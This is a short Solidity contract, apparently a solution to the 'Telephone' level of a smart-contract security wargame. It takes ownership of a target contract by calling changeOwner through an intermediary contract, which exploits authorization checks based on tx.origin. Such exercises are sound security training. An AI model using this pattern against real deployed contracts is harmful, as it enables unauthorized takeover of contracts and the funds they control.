// SPDX-License-Identifier: MIT
pragma solidity ^0.8.26;

interface ITelephone {
    function changeOwner(address newOwner) external;
}

contract TelephoneAttacker {
    ITelephone public telephone;

    constructor(address _telephone) {
        telephone = ITelephone(_telephone);
    }

    function attack() external {
        telephone.changeOwner(msg.sender);
    }
}
